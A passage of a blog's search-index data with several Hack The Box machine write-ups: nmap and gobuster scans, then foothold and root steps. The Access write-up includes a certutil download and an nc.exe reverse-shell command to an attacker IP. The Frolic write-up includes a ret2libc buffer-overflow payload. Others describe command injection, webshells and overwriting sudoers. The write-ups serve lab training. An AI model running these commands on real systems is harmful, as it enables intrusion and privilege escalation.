","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/images/lacasadepapel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/","summary":"LaCasaDePapel Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.131 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 16:13 BST Nmap scan report for 10.10.10.131 (10.10.10.131) Host is up (0.19s latency). Not shown: 982 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 7.9 (protocol 2.0) | ssh-hostkey: | 2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA) | 256 41e495a3390b25f9dadebe6adc59486d (ECDSA) |_ 256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519) 80/tcp open http Node.","tags":["HTB","vsftpd","searchsploit","python","psy","php","php-disable-functions","certificate","client-certificate","openssl","directory-traversal","lfi","ssh","pspy","supervisord","cron","metasploit","ida","iptables","js","certificate-authority","reverse-engineering"],"title":"[HTB] Machine: LaCasaDePapel"},{"categories":null,"contents":"Netmon Enumeration nmap └─$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-trane-info: Problem with XML parsing of /evox/about | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2023-06-15T19:11:33 |_ start_date: 2023-06-15T18:35:59 | smb2-security-mode: | 311: |_ Message signing enabled but not required |_clock-skew: mean: -29s, deviation: 0s, median: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 67.73 seconds Web server Foothold/User/Root After trying default creds for PRTG, I enumerated ftp Seems like we can read majority of the folders Let\u0026rsquo;s check PRTG installed folder and search for creds According to post we have to check ProgramdData\\Paessler\\PRTG Network Monitor We see a backup configuration file PRTG Configuration.old.bak Let\u0026rsquo;s download it We found our creds No success However, if we check the screenshot and the password, the backup file was created in 2018, so lets try 2019 and so on It worked, the password ends with 2019 There is a post about command injection in PRTG Open the page indicated in the screen Add new notification Scroll down and select Execute Program Add your payload to parameter I tried different variations of payload, like adding a new user, reverse shell from https://www.revshells.com/ So the solution was to use encoded reverse shell for powershell, but with conversion to UTF-16LE Save Test notification Rooted ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/netmon/images/netmon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/netmon/","summary":"Netmon Enumeration nmap └─$ nmap -sC -sV -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 20:11 BST Nmap scan report for 10.10.10.152 (10.10.10.152) Host is up (0.16s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 09:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 10:56PM \u0026lt;DIR\u0026gt; Program Files | 02-03-19 12:28AM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 08:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 11:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.","tags":["HTB","ftp","password-reuse","prtg","command-injection","psexec-py"],"title":"[HTB] Machine: Netmon"},{"categories":null,"contents":"SwagShop Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.83 seconds gobuster └─$ gobuster dir -u http://swagshop.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://swagshop.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php [+] Timeout: 10s =============================================================== 2023/06/17 13:09:03 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 291] /index.php (Status: 200) [Size: 16593] /media (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/media/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://swagshop.htb/includes/] /lib (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/lib/] /install.php (Status: 200) [Size: 44] /app (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/app/] /js (Status: 301) [Size: 309] [--\u0026gt; http://swagshop.htb/js/] /api.php (Status: 200) [Size: 37] /shell (Status: 301) [Size: 312] [--\u0026gt; http://swagshop.htb/shell/] /skin (Status: 301) [Size: 311] [--\u0026gt; http://swagshop.htb/skin/] /cron.php (Status: 200) [Size: 0] /var (Status: 301) [Size: 310] [--\u0026gt; http://swagshop.htb/var/] /errors (Status: 301) [Size: 313] [--\u0026gt; http://swagshop.htb/errors/] /.php (Status: 403) [Size: 291] /mage (Status: 200) [Size: 1319] /server-status (Status: 403) [Size: 300] Web server Admin page No info about the version Foothold/User Searchsploit Run poc\nLogin with creds Now we can try authenicated RCEs By the way, if you need to install pip2.7 Exploit Well, it\u0026rsquo;s not working The first error was solved by commenting: br.form.new_control('text', 'login[username]', {'value': username}) Now we need to find a way to solve the another error Launch Burp Suite and check requests Okay we send 5 requests in total According to exploit it searches for ajaxBlockUrl Which is returned to third request Let\u0026rsquo;s follow redirects Modify the payload We get our rce Now send payload and get reverse shell Root Let\u0026rsquo;s check sudo rights Check GTFOBins and get root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/swagshop/images/swagshop.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/swagshop/","summary":"SwagShop Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.140 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 12:50 BST Nmap scan report for 10.10.10.140 (10.10.10.140) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","magento","deserialization","webshell","sudo"],"title":"[HTB] Machine: SwagShop"},{"categories":null,"contents":"Writeup Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds Web server Foothold/User The site was generated by CMS Made Simple Searchsploit We don\u0026rsquo;t know the version, but we can try exploits that cover majority of versions Post Python3 version of exploit iconv -t UTF-8 -f iso-8859-1 /usr/share/wordlists/rockyou.txt \u0026gt; rockyou-utf8.txt in case you want to crack using the script, but I suggest using hashcat python3 cms_exploit.py -u http://10.10.10.138/writeup -w rockyou-utf8.txt Let\u0026rsquo;s crack the hash ssh to box Root Enumerate for privesc Automated tasks Groups staff: Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may \u0026quot;override\u0026quot; the executables in /bin and /usr/bin with the same name). Compare with group \u0026quot;adm\u0026quot;, which is more related to monitoring/security. - according to wiki We can only exploit that only via relative path Let\u0026rsquo;s find a way to exploit that When I tried connecting again via ssh while pspy was on, we see run-parts is executed via relative path So let\u0026rsquo;s create a script Make it executable Setup listener Connect via ssh again And we have our root ","date":"June 16, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/writeup/images/writeup.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/writeup/","summary":"Writeup Enumeration nmap └─$ nmap -Pn -sC -sV 10.10.10.138 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-16 18:03 BST Nmap scan report for 10.10.10.138 (10.10.10.138) Host is up (0.10s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd5310700bd0470ae27e4ab6429823c7 (RSA) | 256 372e1468aeb9c2342b6ed992bcbfbd28 (ECDSA) |_ 256 93eaa84042c1a83385b35600621ca0ab (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","cmsms","sqli","injection"],"title":"[HTB] Machine: Writeup"},{"categories":null,"contents":"Access Enumeration nmap └─$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.1.7600 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: MegaCorp | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_clock-skew: -29s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds Web Server Foothold/User Let\u0026rsquo;s enumerate ftp Traverse directories and download everything We see Access Control archive I tried unzipping with unzip, but had no success Using 7z was more successful, since it asked for password So now we need to look for password Let\u0026rsquo;s check backup file It\u0026rsquo;s a Microsoft Access Database We can use mdbtools sudo apt install mdbtools List the tables We see auth_-_user table Let\u0026rsquo;s dump it We can try each password to unzip the Access Control archive After unzipping we get a pst file, which is Microsoft Outlook email folder I used readpst sudo apt install pst-utils It\u0026rsquo;s a plain text file Just open it with less 'Access Control.mbox' We see an email with creds We have open telnet port Let\u0026rsquo;s connect with obtained creds Root Let\u0026rsquo;s enumerate for privesc We find a interesting lnk file It runs runas with savecred options Let\u0026rsquo;s check cmdkey for saved credentials We see that we have ACCESS\\Administrator\u0026rsquo;s credentials saved Let\u0026rsquo;s use them and get our root Download nc: certutil -urlcache -f http://10.10.16.3:8000/shell.ps1 shell.ps1 And start reverse shell: runas /user:ACCESS\\Administrator /savecred \u0026quot;nc.exe 10.10.16.3 6666 -e cmd\u0026quot; Check 0xdf\u0026rsquo;s blog for other privesc paths ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/access/images/access.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/access/","summary":"Access Enumeration nmap └─$ nmap -sC -sV 10.10.10.98 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 14:20 BST Nmap scan report for 10.10.10.98 (10.10.10.98) Host is up (0.094s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet Microsoft Windows XP telnetd | telnet-ntlm-info: | Target_Name: ACCESS | NetBIOS_Domain_Name: ACCESS | NetBIOS_Computer_Name: ACCESS | DNS_Domain_Name: ACCESS | DNS_Computer_Name: ACCESS |_ Product_Version: 6.","tags":["HTB","mdbtools","readpst","mutt","telnet","runas","cached-creds","dpapi","pylnker"],"title":"[HTB] Machine: Access"},{"categories":null,"contents":"Curling Enumeration nmap └─$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Home |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: Joomla! - Open Source Content Management Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.29 seconds gobuster └─$ gobuster dir -u http://10.10.10.150 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.150 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/12 18:07:47 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 14264] /media (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/media/] /templates (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/templates/] /modules (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/modules/] /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.150/images/] /bin (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/bin/] /plugins (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/plugins/] /includes (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/includes/] /language (Status: 301) [Size: 315] [--\u0026gt; http://10.10.10.150/language/] /README.txt (Status: 200) [Size: 4872] /components (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.150/components/] /cache (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.150/cache/] /libraries (Status: 301) [Size: 316] [--\u0026gt; http://10.10.10.150/libraries/] /tmp (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/tmp/] /LICENSE.txt (Status: 200) [Size: 18092] /layouts (Status: 301) [Size: 314] [--\u0026gt; http://10.10.10.150/layouts/] /secret.txt (Status: 200) [Size: 17] /administrator (Status: 301) [Size: 320] [--\u0026gt; http://10.10.10.150/administrator/] /configuration.php (Status: 200) [Size: 0] /htaccess.txt (Status: 200) [Size: 3005] /cli (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.150/cli/] Progress: 220515 / 220561 (99.98%) =============================================================== 2023/06/12 18:16:06 Finished =============================================================== Web server Joomla And let\u0026rsquo;s find joomla version Foothold Let\u0026rsquo;s check secret.txt returned by gobuster Probably a password We see the possible username Try creds to enter the administrator page We can create a new php file and use it to launch a reverse shell Let\u0026rsquo;s create it in templates page And we get our rce Set up a listener an send your reverse shell payload We got our foothold User Let\u0026rsquo;s check floris home folder We see password_backup file Which looks like a bz2 archive I uploaded archive to my vm And converted it back to binary using xxd Then decompressed using bunzip2, which result in gzip file Repeat decompressing until we get password.txt Use password to ssh or su as floris Root Enumerate for privesc linpeas and pspy64 We see an automated process/job running The job inputs config file to curl via -K option: Specify a text file to read curl arguments from. The command line arguments found in the text file will be used as if they were provided on the command line. So we can try modifying input file and read our flag Or we can add floris to sudoers by overwriting original sudoers file on the machine Create sudoers file on our box and deploy http server Modify input file to download and replace sudoers file Wait for the task and then sudo su We are root Useful: You can watch the modification of file with watch command watch -n 1 cat report ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/curling/images/curling.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/curling/","summary":"Curling Enumeration nmap └─$ nmap -sC -sV 10.10.10.150 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-12 17:50 BST Nmap scan report for 10.10.10.150 (10.10.10.150) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8ad169b490203ea7b65401eb68303aca (RSA) | 256 9f0bc2b20bad8fa14e0bf63379effb43 (ECDSA) |_ 256 c12a3544300c5b566a3fa5cc6466d9a9 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","joomla","searchsploit","webshell","cron","pspy","curl","suid","cve-2019-7304","dirty-sock","ubuntu","exploit","arbitrary-write"],"title":"[HTB] Machine: Curling"},{"categories":null,"contents":"Frolic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1880/tcp open vsat-control 9999/tcp open abyss Nmap done: 1 IP address (1 host up) scanned in 1037.54 seconds └─$ nmap -sV -sC -p22,139,445,1880,9999 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 17:10 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 877b912a0f11b6571ecb9f77cf35e221 (RSA) | 256 b79b06ddc25e284478411e677d1eb762 (ECDSA) |_ 256 21cf166d82a430c3c69cd738bab502b0 (ED25519) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 1880/tcp open http Node.js (Express middleware) |_http-title: Node-RED 9999/tcp open http nginx 1.10.3 (Ubuntu) |_http-server-header: nginx/1.10.3 (Ubuntu) |_http-title: Welcome to nginx! Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h50m26s, deviation: 3h10m30s, median: -27s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-14T16:09:55 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: frolic | NetBIOS computer name: FROLIC\\x00 | Domain name: \\x00 | FQDN: frolic |_ System time: 2023-06-14T21:39:55+05:30 |_nbstat: NetBIOS name: FROLIC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.51 seconds smbmap └─$ smbmap -H 10.10.10.111 [+] Guest session IP: 10.10.10.111:445 Name: 10.10.10.111 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (frolic server (Samba, Ubuntu)) └─$ smbclient -N -L //10.10.10.111 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers IPC$ IPC IPC Service (frolic server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FROLIC gobuster port 9999 └─$ gobuster dir -u http://10.10.10.111:9999 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:34:41 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/admin/] /test (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/test/] /dev (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/backup/] /loop (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/loop/] └─$ gobuster dir -u http://10.10.10.111:9999/dev -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:9999/dev [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/06/14 17:45:50 Starting gobuster in directory enumeration mode =============================================================== /test (Status: 200) [Size: 5] /backup (Status: 301) [Size: 194] [--\u0026gt; http://10.10.10.111:9999/dev/backup/] gobuster port 1880 └─$ gobuster dir -u http://10.10.10.111:1880 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.111:1880 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2023/06/22 16:42:49 Starting gobuster in directory enumeration mode =============================================================== /icons (Status: 401) [Size: 12] /red (Status: 301) [Size: 173] [--\u0026gt; /red/] /vendor (Status: 301) [Size: 179] [--\u0026gt; /vendor/] /settings (Status: 401) [Size: 12] /Icons (Status: 401) [Size: 12] /nodes (Status: 401) [Size: 12] Web server on port 1880 Web server on port 9999 Playsms Foothold/User Open files from backup route Which doesn\u0026rsquo;t work on any login page, so let\u0026rsquo;s continue enumeration If we check admin path View page source and open login.js We see the creds Let\u0026rsquo;s use them We get a weird puzzle or encrypted message Googling quite a bit resulted in esoteric programming language called Ook! Ook! Interpreter Decoded as: Nothing here check /asdiSIAJJ0QWE9JAS Let\u0026rsquo;s navigate there More encoded text Let\u0026rsquo;s curl it and decode it Which looks like a zip file Let\u0026rsquo;s unzip it Looks like it\u0026rsquo;s protected with a password Use frackzip or john2zip with john: https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux Another encoded text Remove \\r\\n to be able to decode from base64 It\u0026rsquo;s a brainfuck Interpreter Result: idkwhatispass Entering the creds to every login page Worked for Playsms login page I didn\u0026rsquo;t find a version of the application There is a list of public exploits Let\u0026rsquo;s play with php/webapps/42044.txt https://www.exploit-db.com/exploits/42044 https://www.youtube.com/watch?v=KIB9sKQdEwE Create backdoor.csv Upload csv to Phonebook We got shell Root Let\u0026rsquo;s enumerate We find a binary called rop Owned by root with setuid Which implies binary exploitation using rop Let\u0026rsquo;s download it Let\u0026rsquo;s check if we can overwrite the EIP register Create pattern msf-pattern_create -l 200 Then run binary by inputing the pattern Check EIP register Find the offset using the value of EIP: msf-pattern_offset -q 'b7Ab' We see the offset is equal to 52 So let\u0026rsquo;s test it: python3 -c 'print(\u0026quot;A\u0026quot; * 52 + \u0026quot;BBBB\u0026quot;)' And input the result to binary and check the EIP Let\u0026rsquo;s also check ASLR cat /proc/sys/kernel/randomize_va_space Okay, ASLR is off Let\u0026rsquo;s find the addresses of system and exit, since we want to overwrite EIP, so that we force program to return/call the system But we also need to make a correct stack shape, so that the program finds the arguments ldd rop - to list dynamic dependencies of the rop binary readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; system@\u0026quot; - display system table information about the object file and grep system readelf -s /lib/i386-linux-gnu/libc.so.6 | grep \u0026quot; exit@\u0026quot; - display system table information about the object file and grep exit strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh - get a /bin/sh strings offset in libc Now we need to calculate the addresses and craft a payload system = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0 exit = 0xb7e19000 + 0x0002e9d0 = 0xb7e479d0 /bin/sh = 0xb7e19000 + 0x15ba0b = 0xb7f74a0b Payload: \u0026ldquo;A\u0026rdquo; * 52 + SYSTEM + EXIT + SHELL The image of the stack frame after we \u0026ldquo;call\u0026rdquo; system So let\u0026rsquo;s exploit python -c 'print(\u0026quot;A\u0026quot;*52 + \u0026quot;\\xa0\\x3d\\xe5\\xb7\u0026quot; + \u0026quot;\\xd0\\x79\\xe4\\xb7\u0026quot; + \u0026quot;\\x0b\\x4a\\xf7\\xb7\u0026quot;)' Supply the payload to binary And we are root ","date":"June 12, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/frolic/images/frolic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/frolic/","summary":"Frolic Enumeration nmap └─$ nmap -Pn -p- 10.10.10.111 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 16:52 BST Nmap scan report for 10.10.10.111 (10.10.10.111) Host is up (0.15s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds 